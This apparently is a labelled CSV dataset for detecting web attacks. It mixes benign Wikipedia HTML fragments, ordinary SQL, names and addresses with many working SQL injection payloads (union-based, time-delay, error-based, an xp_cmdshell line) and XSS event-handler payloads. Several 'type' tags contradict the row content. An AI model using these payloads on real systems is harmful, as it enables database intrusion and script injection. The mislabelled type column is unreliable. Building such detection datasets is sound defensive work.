Text,Label,type
"<li><a href=""/wiki/Rendering_(computer_graphics)"" title=""Rendering (computer graphics)"">Rendering </a> </li>",0,xss
"<style>:target {color: red;}</style><tbody id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tbody>",2,xss
"1  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  3326  =  3326",1,sql
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,2,xss
SELECT * FROM ruler WHERE master NOT LIKE '[before]%',0,xss
"<style>:target {color:red;}</style><object id=x style=""transition:color 1s"" ontransitionend=alert(1)></object>",2,xss
SELECT AVG ( its ) FROM write SELECT SUM ( nearly ) ,0,xss
olaf,0,sql
SELECT AVG ( relationship ) FROM when SELECT SUM ( consist ) ,0,xss
"  SELECT TIMESTAMP ( ""2017-07-23"" ) ;",0,xss
"<param draggable=""true"" ondrag=""alert(1)"">test</param>",2,xss
<button onpointermove=alert(1)>XSS</button>,2,xss
SELECT * FROM itself WHERE made = 'equal'  OR universe = 'concerned',0,sql
45571518p,0,sql
"<li id=""cite_note-FOOTNOTEDomingos2015Chapter_1-67""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEDomingos2015Chapter_1_67-0"">^ </a> </b> ",0,xss
SELECT AVG ( Price ) FROM fastened,0,xss
SELECT weak,0,sql
SELECT TOP 3 * FROM worker WHERE ancient = 'typical' SELECT * FROM life,0,sql
SELECT * FROM route FETCH FIRST 3 ROWS ONLY,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
lorenson-tordi@youtubeanunciox.fk,0,sql
SELECT TOP 50 PERCENT * FROM wind,0,xss
	 </span></a></dt><dd>Learn more by playing with a pre-made Scrapy project.</dd>,0,xss
"-1376%""   )    )     )   or 3458  =  9503 and    (    (     (  ""%""  =  """,1,sql
SELECT * FROM people WHERE desk LIKE '%laid%',0,sql
"elt  (  5098  =  2728,1  )  ",1,sql
SELECT Count ( * )  AS familiar,0,xss
calle corinto 108,0,sql
SELECT * FROM replace FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM policeman,0,sql
"  UPDATE strange SET establish =  'nation', City =  'meant' WHERE anyone =  weigh",0,sql
"-3971%'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  '%'  =  '",1,xss
SELECT those FROM rear,0,sql
"  SELECT Orders.opportunityrID, Employees.oxygen, Employees.heard FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.findID ORDER BY Orders.windowID",0,xss
"  SELECT * FROM however WHERE floor IN  ( 'his', 'wealth', 'deeply' )  ",0,sql
"-5300' union all select 2750,2750,2750,2750,2750,2750--",1,sql
3.78104E+15,0,sql
"<li><a href=""/wiki/Glossary_of_agriculture"" title=""Glossary of agriculture"">Agriculture </a> </li>",0,xss
"<u oncontextmenu=""alert(1)"">test</u>",2,xss
Multi-agent planning and emergent behavior:,0,xss
DELETE FROM win,0,sql
1230,0,sql
SELECT * FROM am WHERE pale NOT BETWEEN 'history' AND 'trouble',0,sql
"  SELECT MAKEDATE ( 2017, 3 ) ;",0,sql
barrera medio,0,xss
"1""   )    )    as casz where 5921  =  5921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,sql
 </li>,0,xss
"   SELECT Employees.ready, COUNT ( Orders.abilityID )  AS usualFROM    ( OrdersINNER JOIN lady ON Orders.wholeID  =  Employees.everythingID ) ",0,sql
SELECT * FROM rubber FETCH FIRST 3 ROWS ONLY,0,xss
igal,0,sql
SELECT column_name ( s )  FROM table1 UNION,0,sql
"<isindex onmouseout=""alert(1)"">test</isindex>",2,xss
" SELECT * FROM vapor ORDER BY adjective, consider",0,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meta id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></meta>",2,xss
"1'||  (  select 'zpwe' from dual where 7743  =  7743 union all select null,null#",1,sql
"<style>:target {color: red;}</style><option id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></option>",2,xss
SELECT * FROM move 3,0,sql
SELECT * FROM sugar WHERE send NOT BETWEEN 'everybody' AND 'not',0,sql
"1""  )   as ybkp where 7788  =  7788 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,sql
"1'  )   where 8268  =  8268 union all select null,null,null,null--",1,xss
6370,0,sql
5.5584E+15,0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=www.cnas.org%2Fpublications%2Freports%2Funderstanding-chinas-ai-strategy&amp;rft.atitle=Understanding+China%27s+AI+Strategy&amp;rft.date=2019-02-06&amp;rft.aulast=Allen&amp;rft.aufirst=Gregory&amp;rft_id=https%3A%2F%2Fwww.cnas.org%2Fpublications%2Freports%2Funderstanding-chinas-ai-strategy&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
a3ui11d,0,xss
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'ozur'  =  'ozur",1,xss
4.85943E+15,0,xss
"1"" where 1719  =  1719 and 7533  =  7533--",1,sql
"<multicol onbeforecopy=""alert(1)"" contenteditable>test</multicol>",2,xss
46562846j,0,xss
SELECT * FROM motor  WHERE ordinary = fox,0,sql
SELECT * FROM crop WHERE at = 'suggest'  AND  ( wrote = 'small' OR them = 'dance' ) ,0,xss
1'||  (  select 'dezl' where 8661  =  8661,1,sql
 </li>,0,xss
"1  )   as qyic where 9736  =  9736 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
  )  ;waitfor delay '0:0:__TIME__'--,1,sql
SELECT AVG ( Price ) FROM hide,0,xss
SELECT * FROM prepare WHERE two = 'paper' FETCH FIRST 3 ROWS ONLY,0,xss
"<time draggable=""true"" ondrag=""alert(1)"">test</time>",2,xss
"	 </span> <span class=""reference-text"">",0,xss
 </p>,0,xss
"<li><a href=""/wiki/G%C3%B6del%27s_incompleteness_theorems"" title=""Gödel&#39;s incompleteness theorems"">Incompleteness theorem </a><span class=""nowrap"">&#160; ",0,xss
"1""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""xtyt""  =  ""xtyt",1,xss
 </li>,0,xss
"<style>:target {transform: rotate(180deg);}</style><ins id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></ins>",2,xss
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh'  =  'vhvh",1,sql
admin' or 1  =  1--,1,sql
SELECT fastened ( s )  FROM fewer LEFT JOIN,0,sql
"1%""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  ""%""  =  """,1,xss
"<marquee draggable=""true"" ondragend=""alert(1)"">test</marquee>",2,xss
"calle homero, 127",0,xss
<i onpointerdown=alert(1)>XSS</i>,2,xss
<figcaption onpointermove=alert(1)>XSS</figcaption>,2,xss
"1""  )   where 3958  =  3958 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
-1468'   )    )     )   or 4875  =  6163#,1,sql
"  SELECT * FROM empty WHERE afraid IN  ( 'appearance', 'track', 'purpose' )  ",0,sql
"	 </span> <span class=""reference-text"">",0,xss
SELECT clearly ( s )  FROM naturally FULL OUTER JOIN,0,xss
"	 </span> <span class=""reference-text"">R. J. Williams and D. Zipser. Gradient-based learning algorithms for recurrent networks and their computational complexity. In Back-propagation: Theory, Architectures and Applications. Hillsdale, NJ: Erlbaum, 1994. ",0,xss
SELECT AVG ( Price ) FROM carried,0,sql
"<caption onpaste=""alert(1)"" contenteditable>test</caption>",2,xss
<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>,2,xss
"1"" where 7015  =  7015 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,sql
5.57567E+15,0,sql
"  SELECT sillyID AS ID, darkness AS depend FROM basis",0,sql
alide,0,sql
03046730n,0,sql
camisoln,0,xss
"-8166""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""lcqb""  =  ""lcqb",1,xss
1'   )    )    as tley where 3539  =  3539,1,sql
SELECT * FROM sea FETCH FIRST 3 ROWS ONLY,0,xss
<dir onpointerout=alert(1)>XSS</dir>,2,xss
"  UPDATE cry SET feel =  'operation', City =  'stage' WHERE wrapped =  melted",0,sql
"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1,sql
SELECT COUNT ( certain ) FROM factory,0,sql
96to3a38,0,sql
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1,sql
SELECT TOP 3 * FROM whether WHERE spend = 'space',0,xss
cabot@eurograb.tel,0,sql
SELECT TOP 3 * FROM caught SELECT * FROM pretty 3SELECT * FROM beneath,0,sql
a9tr8pfag4,0,sql
"calle dinamarca 14,",0,sql
-2761 or 1144  =  7657-- mfml,1,sql
SELECT * FROM turn FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM stood,0,sql
frechette8@legami.ly,0,xss
SELECT * FROM shelf WHERE sometime  BETWEEN 10 AND 20,0,sql
arceo feliu,0,sql
"<li><a href=""/wiki/Process_control"" title=""Process control"">Process control system </a> </li>",0,xss
" select * from users where id  =  1 or ""_{"" or 1  =  1 -- 1",1,sql
SELECT * FROM something WHERE    NOT parallel = 'deer',0,sql
34192,0,sql
larribea,0,sql
<td id=x tabindex=1 onbeforedeactivate=alert(1)></td><input autofocus>,2,xss
"<div id=""footer"" role=""contentinfo"" >",0,xss
"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",1,sql
"-5606  )   union all select 7118,7118,7118,7118,7118,7118,7118,7118,7118#",1,sql
"  SELECT Orders.primitiverID, Employees.fair, Employees.brief FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.identityID ORDER BY Orders.neighborhoodID",0,sql
t'exec master..xp_cmdshell 'nslookup www.googl ...,1,sql
"   SELECT policeman, sit+ ', ' + wait+ ' ' + whole+ ', ' + without AS older  FROM there",0,sql
trobos 39 4e,0,xss
<ins onpointerover=alert(1)>XSS</ins>,2,xss
8i4trib7ti5a,0,sql
SELECT AVG ( military ) FROM entirely,0,sql
21840329n,0,sql
-5116  )   or   (  8287  =  4930  )  *4930,1,sql
	 </span>,0,xss
tebbe,0,xss
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,xss
SELECT * FROM treated FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
",@variable",1,sql
"<figure onmouseleave=""alert(1)"">test</figure>",2,xss
"1' where 9241  =  9241 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"<datalist onmouseout=""alert(1)"">test</datalist>",2,xss
SELECT AVG ( bigger ) FROM surprise,0,sql
"calle mariano garcia, s/n",0,sql
"<data onmouseout=""alert(1)"">test</data>",2,xss
"<style>:target {transform: rotate(180deg);}</style><dialog id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dialog>",2,xss
	 </span> </h3>,0,xss
"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",1,sql
SELECT * FROM finger WHERE magnet NOT BETWEEN 'common' AND 'lucky',0,sql
SELECT * FROM type  WHERE cow NOT LIKE '[rocky]%',0,sql
a4go37a,0,xss
SELECT * FROM bicycle WHERE ten = 'road',0,xss
"	 </span> <span class=""reference-text""><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, p.&#160;204 ",0,xss
"<a href=""/wiki/John_McCarthy_(computer_scientist)"" title=""John McCarthy (computer scientist)"">McCarthy </a> and AI research at <a href=""/wiki/Stanford_Artificial_Intelligence_Laboratory"" class=""mw-redirect"" title=""Stanford Artificial Intelligence Laboratory"">SAIL </a> and <a href=""/wiki/SRI_International"" title=""SRI International"">SRI International </a>:",0,xss
kri!sti,0,sql
SELECT LAST_INSERT_ID (  ) ;,0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
<blockquote onpointerover=alert(1)>XSS</blockquote>,2,xss
"1%'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  '%'  =  '",1,sql
"-6405' union all select 8235,8235,8235,8235,8235#",1,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28635 )  ORDER BY meta_id ASC",0,sql
 (  select   (  case when   (  6986  =  6986  )   then 6986 else 6986*  (  select 6986 from mysql.db  )   end   )    ) ,1,xss
22618043g,0,sql
"<style>:target {color:red;}</style><figcaption id=x style=""transition:color 1s"" ontransitionend=alert(1)></figcaption>",2,xss
"<li><a href=""/wiki/Friedrich_Wilhelm_Joseph_Schelling"" title=""Friedrich Wilhelm Joseph Schelling"">Friedrich Schelling </a> </li>",0,xss
"-9208%""   )    )    or 8571  =  8571--",1,sql
" SELECT * FROM student ORDER BY party, golden",0,xss
" SELECT column_name ( s )  FROM cover,temperature",0,sql
"1'  )   and make_set  (  8403  =  8403,8899  )  ",1,sql
ikediek torrades,0,sql
"<style draggable=""true"" ondragend=""alert(1)"">test</style>",2,xss
SELECT * FROM likely WHERE equally = 'is',0,sql
SELECT COUNT ( DISTINCT visit )  FROM prove,0,sql
"<wbr onkeyup=""alert(1)"" contenteditable>test</wbr>",2,xss
"<li><cite id=""CITEREFNeedham1986"" class=""citation book""><a href=""/wiki/Joseph_Needham"" title=""Joseph Needham"">Needham, Joseph </a> (1986). <a href=""/wiki/Science_and_Civilization_in_China"" class=""mw-redirect"" title=""Science and Civilization in China""><i>Science and Civilization in China: Volume 2 </i> </a>. Caves Books Ltd. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Science+and+Civilization+in+China%3A+Volume+2&amp;rft.pub=Caves+Books+Ltd.&amp;rft.date=1986&amp;rft.aulast=Needham&amp;rft.aufirst=Joseph&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<h1 draggable=""true"" ondragend=""alert(1)"">test</h1>",2,xss
"1%""   )    )     )   union all select null#",1,xss
select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,1,xss
"<html onmouseenter=""alert(1)"">test</html>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>",2,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=63"" title=""Edit section: Strong AI hypothesis"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
1%'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   '%'  =  ',1,sql
polvo,0,xss
"-9606%""   )    )     )   union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--",1,sql
"calle perez galdos 193,",0,sql
SELECT TOP 3 * FROM copy WHERE out = 'cheese',0,sql
-4681 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # rltx,1,sql
SELECT behind ( s )  FROM last SELECT dawn ( s ) ,0,sql
"<li><a href=""/wiki/Entertainment_robot"" title=""Entertainment robot"">Entertainment </a> </li>",0,xss
<body onbeforeprint=alert(1)>,2,xss
"<object onbeforecut=""alert(1)"" contenteditable>test</object>",2,xss
SELECT City FROM Suppliers ORDER BY City;,0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 6623 )  ORDER BY meta_id ASC",0,sql
<sub onfocusout=alert(1) tabindex=1 id=x></sub><input autofocus>,2,xss
"1%""  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
millot_power@guejos.sv,0,sql
SELECT * FROM felt WHERE bite = 'feed' LIMIT 3,0,sql
SELECT DISTINCT lovely FROM continued,0,sql
"   SELECT Employees.means, COUNT ( Orders.actuallyID )  AS hurryFROM    ( OrdersINNER JOIN effort ON Orders.appliedID  =  Employees.tankID ) ",0,sql
"<li><a href=""/wiki/Claude_Bernard"" title=""Claude Bernard"">Claude Bernard </a> </li>",0,xss
"1 where 5099  =  5099 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,sql
SELECT * FROM smile 3,0,sql
"-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--",1,sql
3ule1s,0,sql
"	 </span>"" </a>. <i>Business Insider </i>. 25 May 2018<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">6 May ",0,xss
SELECT * FROM snow WHERE Price NOT BETWEEN 10 AND 20,0,sql
aricel,0,sql
rebes huasequi,0,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Artificial_intelligence_in_fiction"" title=""Artificial intelligence in fiction"">Artificial intelligence in fiction </a> </div>",0,xss
SELECT minerals ( s )  FROM folks LEFT JOIN,0,xss
"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--",1,sql
FROM  ( SELECT DISTINCT most FROM earth ) ,0,sql
"<div draggable=""true"" contenteditable>drag me</div><wbr ondragover=alert(1) contenteditable>drop here</wbr>",2,xss
"  SELECT PERIOD_DIFF ( 201710, 201703 ) ;",0,sql
SELECT * FROM band FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM black,0,sql
  <hr/>,0,xss
SELECT any ( s )  FROM close UNION ALL,0,sql
<template onpointerout=alert(1)>XSS</template>,2,xss
1'+  (  select wpbj where 1849  =  1849,1,sql
</ul>,0,xss
1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'xazf'  =  'xazf,1,sql
DELETE FROM behavior WHERE brain = 'unhappy',0,sql
"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,1,xss
SELECT * FROM entire WHERE chair NOT LIKE 'blanket%',0,sql
"  UPDATE vapor SET pile =  'return', City =  'land' WHERE solve =  longer",0,sql
6660,0,sql
SELECT outline FROM worker UNION ALL SELECT start FROM soap ORDER BY dot,0,sql
34844,0,sql
milton,0,xss
SELECT * FROM nearby WHERE closely BETWEEN several09/01/1996kind AND muscle15/31/1996relationship,0,sql
SELECT saddle ( s )  FROM key SELECT there FROM paragraph,0,sql
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondrop=alert(1) contenteditable>drop here</plaintext>",2,xss
"<li><a href=""/wiki/Idea"" title=""Idea"">Idea </a> </li>",0,xss
SELECT * FROM current ORDER BY blind DESC,0,sql
"1""   )    )    as szxa where 1501  =  1501 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,sql
